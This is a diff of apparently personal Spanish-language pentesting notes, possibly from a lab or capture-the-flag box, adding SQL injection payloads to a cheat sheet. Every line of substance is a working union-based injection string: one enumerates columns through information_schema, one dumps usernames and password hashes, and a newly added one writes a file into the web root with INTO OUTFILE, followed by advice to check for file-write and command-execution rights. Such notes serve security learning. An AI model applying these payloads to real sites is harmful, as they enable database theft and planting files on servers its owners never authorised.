@@ -214,13 +214,22 @@ Para ***enumerar nombres de las columnas***
 username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -
 ```
 
-Para mostrar de una manera los datos que te importan
+Para ***mostrar*** de una manera los datos que te importan
 
 ```
 username=masa&country=Albania' union select group_concat(username,0x3a,userhash) from registration;-- -
 
 0x3a son los dos puntos
 ```
+
+Para ***escribir un archivo***( si es que tienens priv no olvides las comillas si no jala)
+
+```
+username=masa&country=Albania' union select "probando" into outfile "/var/www/html/probando.txt";-- -
+```
+
+Siempre prueba si tiene permisos de ejecucion de comandos asi como de escribir archivos.
+
 
 
 ## WFUZZ
